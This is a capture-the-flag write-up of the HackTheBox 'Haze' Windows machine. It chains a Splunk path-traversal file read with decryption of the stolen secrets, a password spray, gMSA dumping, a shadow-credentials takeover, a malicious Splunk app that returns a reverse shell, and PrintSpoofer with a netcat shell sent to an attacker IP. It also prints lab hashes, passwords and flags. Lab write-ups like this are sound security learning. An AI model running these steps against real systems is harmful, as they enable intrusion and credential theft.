```json
Alias: Haze
Date: 08-04_2025
Platform: Hackthebox
OS: Windows
Difficulty: Hard
Status: Complete
IP: 10.10.11.61
```

# Haze
# Lessons Learnt

- Re-Enumerate after every new foothold/user.
- It always helps to locally install the software running on the machine.
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-08 15:51 PKT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Stats: 0:01:28 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 88.33% done; ETC: 15:53 (0:00:00 remaining)
Nmap scan report for 10.10.11.61
Host is up (0.16s latency).
Not shown: 985 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-08 18:52:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp open  http          Splunkd httpd
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry
|_/
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F
8088/tcp open  ssl/http      Splunkd httpd
|_http-server-header: Splunkd
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2025-03-05T07:29:08
|_Not valid after:  2028-03-04T07:29:08
8089/tcp open  ssl/http      Splunkd httpd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2025-03-05T07:29:08
|_Not valid after:  2028-03-04T07:29:08
|_http-server-header: Splunkd
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-04-08T18:53:04
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 8h00m02s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.41 seconds
```
## Discovered Subdomains
```
best.test.com
```

---
# Enumeration

Splunk is running on port 8000. After doing a little research, I found out that it is vulnerable to CVE-2024-36991 an LFI in the messaging module. It can be tested by:

```
http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd
```

But unfortunately, the splunk passwords obtained from `$SPLUNK_HOME/etc/passwd` won't crack. I was stuck at this point and just searched for `splunk secrets` and came upon this: `https://community.splunk.com/t5/Knowledge-Management/What-is-the-splunk-secret-file-and-is-it-possible-to-change-it/m-p/331207`

Splunk has the functionality to connect to LDAP, and the passwords to connect to LDAP are encrypted using the `splunk.secret` file.

So if we retrieve

```
http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/auth/splunk.secret
```

and

```
http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/authentication.conf
```

We can decrypt the password used for LDAP authentication in authentication.conf.

This python tool is very convenient for that: https://github.com/HurricaneLabs/splunksecrets

```bash
splunksecrets splunk-decrypt -S 'splunk.secret' --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='
```

And we get the password: `Ld@p_Auth_Sp1unk@2k24`

For some reason, trying to log in with the distinguished name we found:

```bash
ldapsearch -H ldap://$IP -D "CN=Paul Taylor,CN=Users,DC=haze,DC=htb" -w 'Ld@p_Auth_Sp1unk@2k24' -b "dc=haze,dc=htb"
```

Won't work. So let's try to guess the username by giving `Paul Taylor` to username anarchy

```bash
~/opt/username-anarchy/username-anarchy -i users.txt

paultaylor
paul.taylor
paultayl
pault
p.taylor
ptaylor
tpaul
t.paul
taylorp
taylor
taylor.p
taylor.paul
pt
```

do a password spray

```bash
nxc smb $IP -u useranarchy.txt -p "Ld@p_Auth_Sp1unk@2k24"
```

and we get:

| Username    | Password              |
| ----------- | --------------------- |
| paul.taylor | Ld@p_Auth_Sp1unk@2k24 |

And it seems that we couldn't log in earlier with the FCDN using ldapsearch because paul has become restricted, and the FCDN has changed to

```
CN=PAUL TAYLOR,OU=RESTRICTED USERS,DC=HAZE,DC=HTB
```

---

# Exploitation

We can't enumerate much through LDAP, can't see other users, etc. Probably because Paul is restricted, so next I did a RID bruteforce to look for other users on the machine and perform a password spray.

And it seems that mark.adams shares the same password

![[Pasted image 20250411210848.png]]

| Username   | Password              |
| ---------- | --------------------- |
| mark.adams | Ld@p_Auth_Sp1unk@2k24 |

And mark.adams can winrm into the box!

```bash
evil-winrm -i $IP -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24'
```

Make sure to re-enumerate with bloodhound using mark.adams.

---

# Lateral Movement

## Haze-IT-Backup$

I noticed in bloodhound that we are a part of the group "GMSA_Managers", It's a custom group and at first using `gMSADumper` to retrieve the password of `Haze-IT-Backup$` won't work, first we have to winrm to the box as mark then give ourselves the right to retrieve passwords

```powershell
Set-ADServiceAccount -Identity 'HAZE-IT-BACKUP$' -PrincipalsAllowedToRetrieveManagedPassword mark.adams
```

Next

```bash
python gMSADumper.py -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' -d haze.htb
```

| Username        | Hash                             |
| --------------- | -------------------------------- |
| Haze-IT-Backup$ | a70df6599d5eab1502b38f9c1c3fd828 |

## Edward.Martins

Next, if we enumerate for bloodhound again using the new credentials, we should find a clear path to Edward.Martins.

![[Pasted image 20250412001207.png]]

First, make `HAZE-IT-BACKUP$` the owner of the group

```bash
bloodyAD --host $IP -u 'Haze-IT-Backup$' -p :a70df6599d5eab1502b38f9c1c3fd828 -d haze set owner SUPPORT_SERVICES 'HAZE-IT-BACKUP$'
```

Next give the account genericAll permissions

```bash
bloodyAD --host $IP -u 'Haze-IT-Backup$' -p :a70df6599d5eab1502b38f9c1c3fd828 -d haze add genericAll SUPPORT_SERVICES 'HAZE-IT-BACKUP$'
```

and then add account to the group

```bash
bloodyAD --host $IP -u 'Haze-IT-Backup$' -p :a70df6599d5eab1502b38f9c1c3fd828 -d haze add groupMember 'SUPPORT_SERVICES' 'HAZE-IT-BACKUP$'
```

Next, set up the kerberos environment to perform a shadow credentials attack.

add shadow creds:

```bash
bloodyAD --host $IP -u 'Haze-IT-Backup$' -p :a70df6599d5eab1502b38f9c1c3fd828 -d haze add shadowCredentials 'edward.martin'
```

Request TGT:

```bash
python3 ~/opt/PKINITtools/gettgtpkinit.py -cert-pem $(pwd)/bYF985Ir_cert.pem -key-pem $(pwd)/bYF985Ir_priv.pem haze.htb/edward.martin bYF985Ir.ccache
```


Get hash from TGT:

```bash
getnthash -key '1ee0ca84576cd9494fcb04de70f4281403295b1c2fa3a8590e8b825d474d69c9' -dc-ip $IP 'haze.htb/edward.martin'
```


| Username      | Password                         |
| ------------- | -------------------------------- |
| edward.martin | 09e0b3eeb2e7a6b0d419e9ff8f4d91af |

And we finally get the user flag

```bash
evil-winrm -i $IP -u edward.martin -H '09e0b3eeb2e7a6b0d419e9ff8f4d91af'
```

We can now access `C:\Backups`, download the splunk backup present there and looking through it, we can find a legacy hash at `var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf` get the secret in the backup from  `/etc/auth/splunk.secret` and decrypt

```bash
splunksecrets splunk-legacy-decrypt -S 'splunk.secret1' --ciphertext '$1$YDz8WfhoCWmf6aTRkA+QqUI='
```

## Alexander.green

We get: `Sp1unkadmin@2k24` supposedly for Alexander.green but can't authenticate with these creds to the DC, but we can log in to splunk

| Username | Password         |
| -------- | ---------------- |
| admin    | Sp1unkadmin@2k24 |

Now that we have access to splunk, let's get a reverse shell.

clone this: https://github.com/0xjpuff/reverse_shell_splunk

Edit the file `bin/rev.ps1` and modify the IP address.

tar the app directory

```bash
tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunk
mv reverse_shell_splunk.tgz reverse_shell_splunk.spl
```

Now go to splunk -> Apps -> Manage Apps -> Install app from file

and upload the file we created, after which we should get a shell as alexander.green.

---
# Privilege Escalation

If we do a
```bat
whoami /all
```

we'll find out the we have the `seImpersonatePrivilege`, this means we can use https://github.com/itm4n/PrintSpoofer to get an elevated shell. Upload the tool to the box and set up a listener, then run:

```powershell
./PrintSpoofer.exe -c "C:\Users\alexander.green\nc.exe 10.10.14.71 4446 -e powershell"
```

Now we are `haze\dc01$`! Privesc was much simpler then user flag.

---

# Flags
- 7b75228f40621801aaf5aba74f90bdb7
- cc5e22feca3d246f54b759ffe293ecc8

#CTF